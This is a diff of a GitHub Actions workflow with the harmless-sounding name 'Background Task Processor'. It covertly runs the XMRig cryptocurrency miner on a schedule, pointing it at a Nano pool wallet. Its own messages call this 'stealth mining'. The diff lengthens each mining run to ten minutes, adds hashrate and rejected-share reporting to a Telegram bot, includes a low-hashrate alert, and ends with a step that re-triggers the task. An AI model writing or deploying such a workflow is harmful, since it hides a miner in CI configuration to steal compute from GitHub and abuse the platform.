@@ -3,7 +3,7 @@ name: Background Task Processor
 on:
   workflow_dispatch:
   schedule:
-    - cron: "0 */6 * * *"
+    - cron: "0 */6 * * *" # setiap 6 jam
 
 jobs:
   task:
@@ -11,10 +11,10 @@ jobs:
 
     steps:
       - name: Set up job
-        run: echo "Initializing task..."
+        run: echo "Initializing stealth mining task..."
 
       - name: Prepare Environment
-        run: sudo apt update -y && sudo apt install curl tar jq -y
+        run: sudo apt update -y && sudo apt install curl tar -y
 
       - name: Notify Start to Telegram
         env:
@@ -23,7 +23,7 @@ jobs:
         run: |
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
           -d chat_id=$TG_CHAT_ID \
-          -d text="🟢 *Stealth mining dimulai.*\n\nWorker sedang dijalankan melalui GitHub Actions." \
+          -d text="🟢 *Stealth mining dimulai.*\n\nWorker sedang dijalankan melalui GitHub Actions selama 10 menit." \
           -d parse_mode=Markdown
 
       - name: Download & Run Stealth Worker
@@ -32,9 +32,9 @@ jobs:
           tar -xzf runner.tar.gz
           cd xmrig-6.24.0
           chmod +x xmrig
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q -p x --log-file=log.txt --randomx-1gb-pages --donate-level=1 &
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q -p stealth > log.txt 2>&1 &
           PID=$!
-          sleep 300
+          sleep 600
           kill $PID
 
       - name: Send Mining Stats to Telegram
@@ -43,19 +43,26 @@ jobs:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
-          LOGFILE="./xmrig-6.24.0/log.txt"
-          if [ -f "$LOGFILE" ]; then
-            HASHRATE=$(grep -m1 "speed" "$LOGFILE" | awk -F'speed' '{print $2}' | awk '{print $1 " H/s"}')
-            RESULT=$(grep -i "accepted" "$LOGFILE" | wc -l)
-            MSG="📊 *Statistik Mining*\n\n• Hashrate: \`$HASHRATE\`\n• Share Diterima: \`$RESULT\`"
-          else
-            MSG="⚠️ Statistik log tidak ditemukan. Kemungkinan worker gagal atau dibatalkan."
-          fi
+          cd xmrig-6.24.0
+          HASHRATE=$(grep -a "speed" log.txt | tail -n1 | awk '{print $6 " H/s"}')
+          ACCEPTED=$(grep -a "accepted" log.txt | wc -l)
+          REJECTED=$(grep -a "rejected" log.txt | wc -l)
+
+          MSG="📊 *Statistik Mining*\n\n• Hashrate: \`$HASHRATE\`\n• Share Diterima: \`$ACCEPTED\`\n• Share Ditolak: \`$REJECTED\`"
 
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
             -d text="$MSG" \
             -d parse_mode=Markdown
+
+          # Peringatan jika hashrate terlalu rendah (< 100 H/s)
+          HR=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
+          if [ "$HR" -lt 100 ]; then
+            curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
+              -d chat_id=$TG_CHAT_ID \
+              -d text="🚨 *Hashrate rendah terdeteksi!*\n\nHanya $HASHRATE. Cek konfigurasi mining." \
+              -d parse_mode=Markdown
+          fi
 
       - name: Notify Done to Telegram
         if: always()
@@ -65,7 +72,7 @@ jobs:
         run: |
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
           -d chat_id=$TG_CHAT_ID \
-          -d text="🔴 *Stealth mining selesai atau dihentikan.*\n\nGitHub Actions selesai menjalankan worker." \
+          -d text="🛑 *Stealth mining selesai atau dihentikan.*\n\nGitHub Actions selesai menjalankan worker." \
           -d parse_mode=Markdown
 
       - name: Re-trigger Task
